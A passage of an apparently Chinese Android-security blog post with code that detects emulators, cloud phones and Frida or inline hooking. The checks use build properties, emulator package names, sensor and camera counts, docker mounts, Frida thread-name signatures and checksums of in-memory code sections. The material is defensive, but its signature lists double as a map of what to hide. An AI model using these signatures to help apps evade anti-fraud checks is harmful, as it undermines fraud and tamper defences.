SystemPropertiesUtils.getProperty(str, null);</span><br><span class="line">//                if (val != null) &#123;</span><br><span class="line">//                    choose.add(str);</span><br><span class="line">//                &#125;</span><br><span class="line">//            &#125;</span><br><span class="line">//        &#125; catch (Throwable e) &#123;</span><br><span class="line">//            e.printStackTrace();</span><br><span class="line">//        &#125;</span><br><span class="line">        //判断是否存在指定硬件</span><br><span class="line">        PackageManager pm = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            pm = context.getPackageManager();</span><br><span class="line">            String[] features = &#123;</span><br><span class="line">                    //PackageManager.FEATURE_RAM_NORMAL,//这个存在问题,自己组装的手机可能导致这个痕迹找不到</span><br><span class="line">                    PackageManager.FEATURE_BLUETOOTH,</span><br><span class="line">                    PackageManager.FEATURE_CAMERA_FLASH,</span><br><span class="line">                    PackageManager.FEATURE_TELEPHONY</span><br><span class="line">            &#125;;</span><br><span class="line">            for (String feature : features) &#123;</span><br><span class="line">                if (!pm.hasSystemFeature(feature)) &#123;</span><br><span class="line">                    choose.add(feature);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Throwable ignored) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    try &#123;</span><br><span class="line">        String[] emuPkgs = &#123;</span><br><span class="line">                &quot;com.google.android.launcher.layouts.genymotion&quot;,</span><br><span class="line">                &quot;com.bluestacks&quot;,</span><br><span class="line">                &quot;com.bignox.app&quot;</span><br><span class="line">        &#125;;</span><br><span class="line"> </span><br><span class="line">        for (String pkg : emuPkgs) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                if (pm != null) &#123;</span><br><span class="line">                    pm.getPackageInfo(pkg, 0);</span><br><span class="line">                &#125;</span><br><span class="line">                choose.add(pkg);</span><br><span class="line">            &#125; catch (Throwable e) &#123;</span><br><span class="line">                //e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Throwable ignored) &#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    try &#123;</span><br><span class="line">        SensorManager sensor = (SensorManager) context.getSystemService(Context.SENSOR_SERVICE);</span><br><span class="line">        int sensorSize = sensor.getSensorList(Sensor.TYPE_ALL).size();</span><br><span class="line">        for (int i = 0; i &lt; sensorSize; i++) &#123;</span><br><span class="line">            Sensor s = sensor.getDefaultSensor(i);</span><br><span class="line">            if (s != null &amp;&amp; s.getName().contains(&quot;Goldfish&quot;)) &#123;</span><br><span class="line">                choose.add(s.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Throwable ignored) &#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    try &#123;</span><br><span class="line">        if (checkSelfPermission(context, &quot;android.permission.READ_SMS&quot;) == 0 ||</span><br><span class="line">                checkSelfPermission(context, &quot;android.permission.READ_PHONE_NUMBERS&quot;) == 0 ||</span><br><span class="line">                    checkSelfPermission(context, &quot;android.permission.READ_PHONE_STATE&quot;) == 0) &#123;</span><br><span class="line">            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);</span><br><span class="line">            String phoneNumber = telephonyManager.getLine1Number();</span><br><span class="line"> </span><br><span class="line">            String[] phoneNumbers = &#123;</span><br><span class="line">                    &quot;15555215554&quot;,</span><br><span class="line">                    &quot;15555215556&quot;,</span><br><span class="line">                    &quot;15555215558&quot;,</span><br><span class="line">                    &quot;15555215560&quot;,</span><br><span class="line">                    &quot;15555215562&quot;,</span><br><span class="line">                    &quot;15555215564&quot;,</span><br><span class="line">                    &quot;15555215566&quot;,</span><br><span class="line">                    &quot;15555215568&quot;,</span><br><span class="line">                    &quot;15555215570&quot;,</span><br><span class="line">                    &quot;15555215572&quot;,</span><br><span class="line">                    &quot;15555215574&quot;,</span><br><span class="line">                    &quot;15555215576&quot;,</span><br><span class="line">                    &quot;15555215578&quot;,</span><br><span class="line">                    &quot;15555215580&quot;,</span><br><span class="line">                    &quot;15555215582&quot;,</span><br><span class="line">                    &quot;15555215584&quot;</span><br><span class="line">            &#125;;</span><br><span class="line">            if(phoneNumber!=null) &#123;</span><br><span class="line">                for (String phone : phoneNumbers) &#123;</span><br><span class="line">                    if (phoneNumber.equalsIgnoreCase(phone)) &#123;</span><br><span class="line">                        choose.add(phone);</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    if (choose.size() &gt; 0) &#123;</span><br><span class="line">        ListItemBean item = new ListItemBean(&quot;检测到APK运行在虚拟机&amp;模拟器中&quot;,</span><br><span class="line">                ListItemBean.RiskLeave.Deadly,</span><br><span class="line">                choose.toString()</span><br><span class="line">        );</span><br><span class="line">        for (String str : choose) &#123;</span><br><span class="line">            item.putData(str);</span><br><span class="line">        &#125;</span><br><span class="line">        return item;</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Android系统提供了一个<code>android.os.Build</code>类，其中包含了大量关于设备硬件和软件版本的信息</p><ul><li>**<code>Build.FINGERPRINT</code> (设备指纹)**：官方模拟器（AVD）的指纹通常以 <code>generic/</code> 开头。许多基于VirtualBox的模拟器（如Genymotion、Nox）的指纹中可能会包含<code>vbox</code>字样。而真实设备的指纹通常是制造商和型号的组合，如 <code>samsung/sm-g9980/...</code>。</li><li>**<code>Build.MODEL</code> (设备型号)**：AVD的型号通常是<code>sdk_gphone64_x86_64</code>或<code>Android SDK built for x86</code>等。Droid4X（卓壮模拟器）也会明确标识其型号。真实设备的型号则是<code>Pixel 7 Pro</code>, <code>SM-G9980</code>等。</li><li>**<code>Build.MANUFACTURER</code> (制造商)**：Genymotion模拟器会将其制造商设置为<code>Genymotion</code>。真实设备则为<code>Google</code>, <code>Samsung</code>, <code>Xiaomi</code>等</li><li>**<code>Build.PRODUCT</code> (产品名称)**：与型号类似，模拟器的产品名也通常是通用的<code>sdk_x86</code>或带有模拟器标识的名称，如<code>nox</code>（夜神模拟器）、<code>vbox86p</code>（VirtualBox平台）</li><li>**<code>Build.BOARD</code> &#x2F; <code>Build.BOOTLOADER</code> (主板&#x2F;引导程序)**：某些模拟器（如夜神）可能会在这些更底层的标识中留下自己的名字。</li><li>**<code>Build.HARDWARE</code> (硬件名称)**：是非常可靠的指标。<code>goldfish</code>是早期AVD使用的虚拟硬件平台名称。<code>ranchu</code>是较新版AVD使用的虚拟硬件平台。<code>vbox86</code>明确指向了VirtualBox x86平台。真实设备的硬件名称通常是芯片组的代号，如<code>qcom</code> (高通), <code>kirin</code> (麒麟), <code>exynos</code> (猎户座)</li></ul><p>**网络环境特征 (Network Environment)**：这是官方Android模拟器（AVD）的默认网络配置。在AVD内部，它通过一个虚拟路由器连接到宿主机网络。这个虚拟路由器将<code>10.0.2.15</code>这个IP地址分配给模拟器本身。这是一个广为人知的特征。</p><p><strong>硬件功能缺失 (Missing Hardware Features)：</strong>使用<code>PackageManager.hasSystemFeature()</code>检查设备是否缺少蓝牙 (<code>FEATURE_BLUETOOTH</code>)、相机闪光灯 (<code>FEATURE_CAMERA_FLASH</code>) 或电话功能 (<code>FEATURE_TELEPHONY</code>)。模拟器为了节省资源，通常不会去模拟这些不常用的硬件</p><p><strong>特定应用包名 (Specific Application Packages)：</strong>检查设备上是否安装了特定包名的应用，如<code>com.bluestacks</code> (蓝叠), <code>com.bignox.app</code> (夜神)</p><p><code>com.google.android.launcher.layouts.genymotion</code> (Genymotion的定制启动器)。</p><p>许多模拟器会预装一些自家的辅助工具、应用商店或服务。通过检查这些应用的包名是否存在，可以直接识别出对应的模拟器</p><p><strong>硬件和驱动特征 (Hardware and Driver Signatures)：</strong>与<code>Build.HARDWARE</code>中的<code>goldfish</code>类似，AVD模拟的传感器（如加速度计、陀螺仪等）也是基于”Goldfish”虚拟硬件的，因此它们的驱动名称会暴露这一信息。真实设备的传感器名称通常来自博世(Bosch)、意法半导体(STMicro)等硬件制造商</p><p><strong>设备信息特征 (Device Information)：</strong>官方模拟器允许设置一个电话号码用于测试，这些<code>1555...</code>开头的号码是Android文档中指定的官方测试号码。如果在设备上读到了这些号码，几乎可以肯定是模拟器环境。此项检测需要<code>READ_PHONE_STATE</code>等相关权限</p><p>**文件系统特征 (File System Artifacts) - *已注释***：模拟器为了正常运行，会在Android文件系统的各个角落留下自己的组件。</p><ul><li><p><strong>QEMU&#x2F;AVD相关</strong>: <code>qemu_pipe</code>, <code>fstab.goldfish</code>, <code>init.ranchu.rc</code>,</p><p> <code>/sys/fs/selinux/booleans/in_qemu</code> 等，这些都与QEMU虚拟机引擎直接相关。</p></li><li><p><strong>VirtualBox相关</strong>: <code>vboxguest.ko</code>, <code>vboxsf.ko</code>, <code>mount.vboxsf</code>, <code>/sys/module/vboxguest</code> 等，这些是VirtualBox的Guest Additions（增强功能）组件，用于虚拟机和宿主机之间的通信与集成。</p></li><li><p><strong>特定模拟器</strong>: <code>init.nox.rc</code> (夜神), <code>droid4x</code> (卓壮), <code>GenymotionLayout</code> (Genymotion), <code>init.tiantian.sh</code> (天天模拟器), <code>windroyed</code> (文卓爷) 等，这些是各家模拟器专属的配置文件、可执行文件或库文件。</p></li></ul><p>**系统属性特征 (System Properties) - *已注释***：</p><p>除了<code>Build</code>类提供的标准信息，Android系统内部还有大量的系统属性（ro.开头的只读属性和qemu.等其他属性）。模拟器会设置很多特定的属性来控制其行为。</p><ul><li><code>ro.kernel.qemu.*</code>: 明确表示内核是在QEMU环境下运行。</li><li><code>init.svc.*</code>: 检查是否有模拟器相关的服务在运行，如<code>init.svc.qemud</code>, <code>init.svc.noxd</code>。</li><li><code>redroid.*</code>, <code>ro.rf.vmname</code>: 这些是云手机方案（如Redroid, 红手指）特有的属性。</li></ul><h3 id="检测云手机"><a href="#检测云手机" class="headerlink" title="检测云手机"></a>检测云手机</h3><p>这块思路还是很多的，不同的云手机检测的思路也不一样 。大部分云手机做的还是很好的，很多都可以过掉<code>Hunter</code>的检测 。</p><h4 id="检测电流-电压"><a href="#检测电流-电压" class="headerlink" title="检测电流&amp;电压"></a>检测电流&amp;电压</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">private final BroadcastReceiver batteryInfoReceiver = new BroadcastReceiver() &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void onReceive(Context context, Intent intent) &#123;</span><br><span class="line"> </span><br><span class="line">        // 电池状态</span><br><span class="line">        int plugged = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);</span><br><span class="line"> </span><br><span class="line">        // 电压（以毫伏为单位）</span><br><span class="line">        int voltage = intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE, -1);</span><br><span class="line"> </span><br><span class="line">        // 获取电池电流（毫安）</span><br><span class="line">        int currentNow = -1;</span><br><span class="line">        if (android.os.Build.VERSION.SDK_INT &gt;= android.os.Build.VERSION_CODES.LOLLIPOP) &#123;</span><br><span class="line">            BatteryManager batteryManager = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);</span><br><span class="line">            currentNow = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CURRENT_NOW);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        // 判断是否在充电</span><br><span class="line">        if (plugged == BatteryManager.BATTERY_PLUGGED_AC || plugged == BatteryManager.BATTERY_PLUGGED_USB || plugged == BatteryManager.BATTERY_PLUGGED_WIRELESS) &#123;</span><br><span class="line">            // 在充电</span><br><span class="line">            if (voltage != -1 &amp;&amp; currentNow != -1) &#123;</span><br><span class="line">                float voltageInVolts = voltage / 1000f; // 将电压转换为伏特</span><br><span class="line">                float currentInAmperes = currentNow / 1000000f; // 将电流转换为安培</span><br><span class="line">                float chargingPower = voltageInVolts * currentInAmperes; // 计算充电功率（瓦特）</span><br><span class="line">                CLog.i(String.format(&quot;充电功率: %.2fW&quot;, chargingPower));</span><br><span class="line">                if (Math.abs(chargingPower) &gt; 300) &#123;</span><br><span class="line">                    CLog.e(&quot;充电功率过高&quot;);</span><br><span class="line">                    handlerItemData(new ListItemBean(</span><br><span class="line">                            &quot;电池异常:充电功率过高(可能是云手机)&quot;,</span><br><span class="line">                            ListItemBean.RiskLeave.Deadly,</span><br><span class="line">                            &quot;检测到过大的充电功率 -&gt; &quot; + String.format(&quot;%.2fW&quot;, Math.abs(chargingPower))</span><br><span class="line">                    ));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="检测摄像头-传感器相关"><a href="#检测摄像头-传感器相关" class="headerlink" title="检测摄像头&amp;传感器相关"></a>检测摄像头&amp;传感器相关</h4><p>判断摄像头有个数 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);</span><br><span class="line">    String[] cameraIds = manager.getCameraIdList();</span><br><span class="line">    //摄像头个数</span><br><span class="line">    CLog.i(&quot;cameraIds -&gt; &quot;+ Arrays.toString(cameraIds));</span><br><span class="line">    if(cameraIds.length &lt; CAMERA_MINIMUM_QUANTITY_LIMIT)&#123;</span><br><span class="line">        items.add(</span><br><span class="line">                new ListItemBean(</span><br><span class="line">                &quot;当前手机可能是模拟器&amp;云手机&quot;,</span><br><span class="line">                ListItemBean.RiskLeave.Warn,</span><br><span class="line">                &quot;camera size -&gt; &quot;+cameraIds.length</span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; catch (Throwable ignored) &#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="检测传感器个数"><a href="#检测传感器个数" class="headerlink" title="检测传感器个数"></a>检测传感器个数</h4><p>这块思路就是直接获取个数，少于<code>10</code>个可以直接认定为黑产 。 我目前没发现那个手机少于10个传感器 ，这块如果可能的话可以尝试调用一下传感器，保证传感器是否可用 ，防止云手机以假乱真 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    //3,检测传感器类型,支持的全部类型传感器</span><br><span class="line">    SensorManager sm = (SensorManager) context.getSystemService(SENSOR_SERVICE);</span><br><span class="line">    List&lt;Sensor&gt; sensorlist = sm.getSensorList(Sensor.TYPE_ALL);</span><br><span class="line"> </span><br><span class="line">    ArrayList&lt;Integer&gt; sensorTypeS = new ArrayList&lt;&gt;();</span><br><span class="line">    for (Sensor sensor : sensorlist) &#123;</span><br><span class="line">        //获取传感器类型</span><br><span class="line">        int type = sensor.getType();</span><br><span class="line">        if (!sensorTypeS.contains(type)) &#123;</span><br><span class="line">            //发现一种类型则添加一种类型</span><br><span class="line">            sensorTypeS.add(type);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //小米k40 51个传感器类型</span><br><span class="line">    //普通的pix 27个</span><br><span class="line">    //华为荣耀20 18个传感器</span><br><span class="line">    CLog.e(&quot;sensor types size -&gt; &quot; + sensorlist.size());</span><br><span class="line">    //我们认为传感器少于20个则认为是风险设备</span><br><span class="line">    if (sensorlist.size() &lt; SENSOR_MINIMUM_QUANTITY_LIMIT) &#123;</span><br><span class="line">        items.add(new ListItemBean(</span><br><span class="line">                &quot;当前手机可能是模拟器&amp;云手机&quot;,</span><br><span class="line">                ListItemBean.RiskLeave.Warn,</span><br><span class="line">                &quot;sensor size -&gt; (&quot;+ sensorlist.size()+&quot;) \n&quot; +</span><br><span class="line">                &quot;sensor type size -&gt; (&quot;+sensorTypeS.size()+&quot;) \n&quot;</span><br><span class="line">                //+ &quot;sensor info -&gt; \n&quot;+ Sensorlist   //打印全部传感器信息</span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="检测传感器名称"><a href="#检测传感器名称" class="headerlink" title="检测传感器名称"></a>检测传感器名称</h4><p>这块检测思路主要是检测传感器的名称，正常小米之类的手机他是不可能存在叫什么 <code>AOSP</code>的传感器的 。</p><p>这种<code>AOSP</code>基本都是自己编译的<code>ROM</code> ，所以这块也可以作为监测点 。可以上报传感器的一些名称信息，也是环境检测一个很重要的抓手</p><p>一般小白肯定不会说去改传感器名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.N) &#123;</span><br><span class="line">    ArrayList&lt;Sensor&gt; aospSensor = new ArrayList&lt;&gt;();</span><br><span class="line">    for(Sensor sensor:sensorlist)&#123;</span><br><span class="line">        if(sensor.getVendor().contains(&quot;AOSP&quot;))&#123;</span><br><span class="line">            aospSensor.add(sensor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (aospSensor.size()&gt;3) &#123;</span><br><span class="line">        CLog.e(&quot;传感器参数是否异常(生产厂商为AOSP)&quot;);</span><br><span class="line">        items.add(new ListItemBean(</span><br><span class="line">                &quot;当前手机可能是模拟器&amp;云手机&quot;,</span><br><span class="line">                ListItemBean.RiskLeave.Warn,</span><br><span class="line">                aospSensor.size()</span><br><span class="line">                        +&quot;/&quot;+sensorlist.size()+&quot;传感器参数异常 -&gt; &quot;+ aospSensor</span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="检测挂载文件"><a href="#检测挂载文件" class="headerlink" title="检测挂载文件"></a>检测挂载文件</h4><p>这块就是去遍历<code>mounts</code> 下面这几个文件，检测里面是否包含<code>docker</code>关键字 ，防止一些云手机搞虚拟化，通过使用<code>docker</code>进行挂载 。</p><p>这块也是很好的监测点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">String[] marks = &#123;&quot;docker&quot;&#125;;</span><br><span class="line">//检测proc/mounts是否包含docker关键字</span><br><span class="line">String mark = NativeEngine.getZhenxiInfoK(&quot;/proc/mounts&quot;,marks );</span><br><span class="line">if(mark == null)&#123;</span><br><span class="line">    mark = NativeEngine.getZhenxiInfoK(&quot;/proc/self/mountstats&quot;, marks);</span><br><span class="line">    if(mark == null)&#123;</span><br><span class="line">        mark = NativeEngine.getZhenxiInfoK(&quot;/proc/self/mountinfo&quot;, marks);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(mark!=null)&#123;</span><br><span class="line">    items.add(new ListItemBean(</span><br><span class="line">            &quot;当前手机可能是模拟器&amp;云手机&quot;,</span><br><span class="line">            ListItemBean.RiskLeave.Warn,</span><br><span class="line">            &quot;(mounts异常)\n&quot;+mark</span><br><span class="line">    ));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="检测ROM是否Match"><a href="#检测ROM是否Match" class="headerlink" title="检测ROM是否Match"></a>检测ROM是否Match</h4><h5 id="检测环境信息："><a href="#检测环境信息：" class="headerlink" title="检测环境信息："></a>检测环境信息：</h5><p>这块思路主要好多种 ，主要是为了防止一些自定义<code>ROM</code> ，通过修改机型的方法，绕过自定义<code>ROM</code>检测逃逸 </p><p>可以直接执行<code>getprop</code> 把所有的环境信息都拿到手 ，如果是小米手机，里面环境信息里面，肯定是有MIUI关键字。</p><p>比如小米的手机，我会去检测是否包含这几个关键环境信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private static final String KEY_MIUI_VERSION_NAME = &quot;ro.miui.ui.version.name&quot;;</span><br><span class="line">private static final String KEY_MIUI_VERSION_CODE = &quot;ro.miui.ui.version.code&quot;;</span><br><span class="line">private static final String KEY_MIUI_INTERNAL_STORAGE = &quot;ro.miui.internal.storage&quot;;</span><br></pre></td></tr></table></figure><p>这块可以采集以后服务端进行判断。防止自定义ROM 机型伪造</p><h5 id="检测服务列表："><a href="#检测服务列表：" class="headerlink" title="检测服务列表："></a>检测服务列表：</h5><p>这块还是执行 <code>service list</code> ，一般小米手机之类的，都会有小米的系统服务，这种东西很难去伪造，如果他伪造了假的 。你就尝试调用即可</p><p>这块还是建议上传到服务端，由服务端算法同学去根据相似度算法去推断，不要再本地进行判断 ，因为<code>Hunter</code>是非联网<code>Apk</code>，所以只是在客户端打了个样子</p><h3 id="检测当前环境是否被Hook"><a href="#检测当前环境是否被Hook" class="headerlink" title="检测当前环境是否被Hook"></a>检测当前环境是否被Hook</h3><p>这块检测方法千奇百怪，首先最基本maps去检测frida或者根据调用栈检测lsp特征 ，基础的检测方案不说了 。因为我觉得并不是一个很好的方案 。改个名就绕过了 。</p><p>比如frida特征三件套 。检测思路主要</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">static const char *FRIDA_THREAD_GUM_JS_LOOP = &quot;gum-js-loop&quot;;</span><br><span class="line">static const char *FRIDA_THREAD_GMAIN = &quot;gmain&quot;;</span><br><span class="line">static const char *FRIDA_NAMEDPIPE_LINJECTOR = &quot;linjector&quot;;</span><br></pre></td></tr></table></figure><p>Hook检测，我们其实只需要检测内存没有被修改即可 。这块需要介绍一下基础原理。和实现的伪代码 。</p><p>正常我们知道一个SO加载到内存里，本质上是通过mmap把so分配到内存里面 ，比如A函数的指令是BBB，那么加载到内存里面应该也是BBB 。</p><p>记住上面这句话 ，我们就可以对内存里面的指令转换成一个int值，然后累加 。如果内存没有被修改 ，累加值文件里面和内存里面的值应该是一样的 。</p><p>因为现在Hook基本都是text段和plt端，一个<code>inlinehook</code>一个<code>got</code>表 。当然Frida可能会延迟启动 ，所以开启一条检测线程，进行轮训操作。</p><p>这块还有一个设计问题，很多开发者也都没注意到 ，就是我开启的这一条线程，被攻击者<code>anti</code>掉 应该怎么办呢？</p><p>因为想要anti掉一条检测线程，方法太多了，N种方法，比如监听全部线程的文件读写，看看那个线程在读取文件 ，只做这一件事，基本八九不离十 ，</p><p>也可以直接Hook开启线程的方法，对开启的线程进行anti 。当然这种思路 就没有好的对抗或者检测办法了么？</p><blockquote><p><strong>其实很简单 ，只需要把在你的检测代码里，对某个变量进行赋值 ，修改flag即可 。</strong></p><p><strong>然后第一次检测完毕以后将主进程的某个变量标志为true，可以使用__NR_process_vm_writev ，又因为是异步的关系，主线程可以延迟2秒对这个标识进行获取，判断是否为true ，</strong></p><p><strong>以确保检测线程成功开启 。</strong></p></blockquote><p>具体检测流程如下，以检测libc为例子，路径可以换成自己需要的路径 ：</p><p>首先获取本地So文件的累加值 ，返回<code>execSection</code> 结构体 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">//记录可执行段的结构体,一个是plt段一个是text段</span><br><span class="line">//所以对应的数量是2</span><br><span class="line">typedef struct stExecSection &#123;</span><br><span class="line">    int execSectionCount;</span><br><span class="line">    unsigned long offset[2];</span><br><span class="line">    unsigned long memsize[2];</span><br><span class="line">    unsigned long checksum[2];</span><br><span class="line">    unsigned long startAddrinMem;</span><br><span class="line">    bool isSuccess = false;</span><br><span class="line">&#125; execSection;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/**</span><br><span class="line"> * 获取本地文件的 Check sum</span><br><span class="line"> * 读取耗时操作,只初始化一次保存到本地。</span><br><span class="line"> */</span><br><span class="line">execSection fetch_checksum_of_library(const char *filePath) &#123;</span><br><span class="line">    execSection section = &#123;0&#125;;</span><br><span class="line">    Elf_Ehdr ehdr;</span><br><span class="line">    Elf_Shdr sectHdr;</span><br><span class="line">    int fd;</span><br><span class="line">    int execSectionCount = 0;</span><br><span class="line">    fd = my_openat(AT_FDCWD, filePath, O_RDONLY, 0);</span><br><span class="line">    if (fd &lt; 0) &#123;</span><br><span class="line">        return section;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    my_read(fd, &amp;ehdr, sizeof(Elf_Ehdr));</span><br><span class="line">    my_lseek(fd, (off_t) ehdr.e_shoff, SEEK_SET);</span><br><span class="line"> </span><br><span class="line">    unsigned long memSize[2] = &#123;0&#125;;</span><br><span class="line">    unsigned long offset[2] = &#123;0&#125;;</span><br><span class="line"> </span><br><span class="line">    //查找section的plt和text开始位置和长度</span><br><span class="line">    for (int i = 0; i &lt; ehdr.e_shnum; i++) &#123;</span><br><span class="line">        my_memset(&amp;sectHdr, 0, sizeof(Elf_Shdr));</span><br><span class="line">        my_read(fd, &amp;sectHdr, sizeof(Elf_Shdr));</span><br><span class="line">        //通常 PLT and Text 一般都是可执行段</span><br><span class="line">        if (sectHdr.sh_flags &amp; SHF_EXECINSTR) &#123;</span><br><span class="line">            offset[execSectionCount] = sectHdr.sh_offset;</span><br><span class="line">            memSize[execSectionCount] = sectHdr.sh_size;</span><br><span class="line">            execSectionCount++;</span><br><span class="line">            if (execSectionCount == 2) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (execSectionCount == 0) &#123;</span><br><span class="line">        